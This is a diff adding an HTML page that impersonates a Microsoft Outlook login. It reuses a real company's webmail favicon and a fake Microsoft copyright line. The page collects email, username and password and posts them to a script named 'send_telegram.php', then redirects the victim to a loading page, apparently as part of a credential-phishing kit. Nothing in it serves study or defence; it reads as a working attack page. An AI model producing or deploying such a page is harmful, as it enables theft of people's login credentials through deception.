@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook</title>
+    <link rel="icon" href="https://mail.hyundaisungwoo.com/owa/auth/15.1.2375/themes/resources/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            height: 100vh;
+        }
+
+        .left-side {
+            background-color: #005bb5;
+            flex: 0.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .left-side .outlook-text {
+            color: white;
+            font-size: 50px;
+            font-weight: bold;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+            letter-spacing: 2px;
+            font-style: normal;
+            transform: translateY(-60px);
+        }
+
+        .right-side {
+            background-color: rgb(244, 254, 255);
+            flex: 2.4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            box-sizing: border-box;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header img {
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .header p {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 4px;
+            color: #333;
+            font-size: 14px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 3px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            background-color: #0072c6;
+            color: white;
+            padding: 12px 0;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #005bb5;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* Mobile responsive styles */
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+            }
+
+            .left-side {
+                display: none;
+            }
+
+            .right-side {
+                flex: 1;
+                padding: 20px;
+                align-items: flex-start;
+            }
+
+            .container {
+                padding: 20px;
+                max-width: 100%;
+            }
+
+            .outlook-text {
+                font-size: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="left-side">
+        <span class="outlook-text">Outlook</span>
+    </div>
+
+    <div class="right-side">
+        <div class="container">
+            <div class="header">
+                <img src="image.png" alt="Logo">
+                <p>Please sign in with your credentials to continue</p>
+            </div>
+            <form id="loginForm" action="send_telegram.php" method="POST" onsubmit="submitForm(event)">
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
+                    <div class="error-message" id="emailError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="username">Username/ID:</label>
+                    <input type="text" id="username" name="username" required>
+                    <div class="error-message" id="usernameError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required>
+                    <div class="error-message" id="passwordError"></div>
+                </div>
+                <input type="submit" value="Sign In">
+            </form>
+            <div class="footer">
+                <p>Â© 2025 Microsoft Outlook. All rights reserved.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+
+            var form = document.getElementById('loginForm');
+            var email = form.querySelector('input[name="email"]').value.trim();
+            var username = form.querySelector('input[name="username"]').value.trim();
+            var password = form.querySelector('input[name="password"]').value.trim();
+            var hasErrors = false;
+
+            document.querySelectorAll('.error-message').forEach(function(el) {
+                el.textContent = '';  // Reset all error messages
+            });
+
+            // Simple validation for empty fields
+            if (!email) {
+                document.getElementById('emailError').textContent = 'Email is required.';
+                hasErrors = true;
+            }
+            if (!username) {
+                document.getElementById('usernameError').textContent = 'Username/ID is required.';
+                hasErrors = true;
+            }
+            if (!password) {
+                document.getElementById('passwordError').textContent = 'Password is required.';
+                hasErrors = true;
+            }
+
+            if (hasErrors) return;
+
+            // If no errors, proceed with submission
+            var formData = new FormData(form);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", form.action, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            xhr.onload = function () {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    if (response.status === "success") {
+                        window.location.href = 'loading.html?email=' + encodeURIComponent(email);
+                    } else {
+                        alert('Error: ' + response.message);
+                    }
+                } else {
+                    alert('Error: Unable to submit form. Status: ' + xhr.status);
+                }
+            };
+
+            xhr.onerror = function () {
+                alert('Error: Network error.');
+            };
+
+            xhr.send(new URLSearchParams(formData).toString());
+        }
+    </script>
+</body>
+</html>
